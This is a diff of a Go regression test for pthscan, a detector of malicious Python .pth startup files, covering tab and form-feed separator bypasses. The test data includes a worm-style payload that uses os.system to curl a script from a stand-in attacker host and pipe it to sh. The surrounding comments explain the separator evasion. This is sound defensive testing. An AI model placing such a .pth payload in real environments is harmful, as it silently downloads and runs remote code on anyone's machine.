@@ -171,31 +171,46 @@ func TestInspectEditableFilenameNotFlagged(t *testing.T) {
 // TestVerifierClaim1_TabSeparatorBypass verifies claim 1:
 // "import\t" (tab separator) bypasses pthscan detection.
 // CPython's site.py reads .pth lines and executes lines starting with "import "
-// (space), but "import\t" (tab) is also valid Python. pthscan must catch it.
+// (space) OR "import\t" (tab). pthscan must catch both.
+//
+// Payload uses os.system, the canonical Hades shape from the adversarial
+// reproducer, so we can assert pth-payload-spawn fires once the tab arm of
+// the import-prefix check is wired in. The original verifier-tree placeholder
+// used a benign open() to make the bypass observable; we replace it with the
+// real worm shape (still tab-separated) so the regression test exercises both
+// the prefix-recognition fix AND the downstream payload classifier in one go.
 func TestVerifierClaim1_TabSeparatorBypass(t *testing.T) {
+	// import\tos; ... — tab between "import" and "os"
+	const wormPayload = "import\tos; os.system('curl -sS https://attacker.tld/bun | sh')\n"
+
 	t.Run("evil-pth-no-setup-suffix", func(t *testing.T) {
-		// import\tos; ... — tab between "import" and "os"
-		content := []byte("import\tos; open('/tmp/marker','w').write('x')\n")
 		v := pthscan.Inspect(pthscan.Input{
-			PthContent: content,
+			PthContent: []byte(wormPayload),
 			FileName:   "evil.pth",
 		})
-		t.Logf("Severity: %s", v.Severity)
-		t.Logf("Signals: %v", codes(v))
-		// If claim is correct: severity == none (full bypass) because
-		// executableLines only matches "import " or "import(" prefix.
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
 	})
 
 	t.Run("evil-pth-with-setup-suffix", func(t *testing.T) {
-		content := []byte("import\tos; open('/tmp/marker','w').write('x')\n")
 		v := pthscan.Inspect(pthscan.Input{
-			PthContent: content,
+			PthContent: []byte(wormPayload),
 			FileName:   "evil-setup.pth",
 		})
-		t.Logf("Severity: %s", v.Severity)
-		t.Logf("Signals: %v", codes(v))
-		// If only filename fires: severity == medium (not critical),
-		// meaning the payload itself is missed.
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
+		require.Contains(t, codes(v), "pth-setup-filename")
+	})
+
+	t.Run("form-feed-separator", func(t *testing.T) {
+		// \f (form-feed) is also CPython tokenizer whitespace; defense in depth
+		// against attackers who switch separator after we patch \t.
+		v := pthscan.Inspect(pthscan.Input{
+			PthContent: []byte("import\fos; os.system('x')\n"),
+			FileName:   "evil.pth",
+		})
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
 	})
 }
 
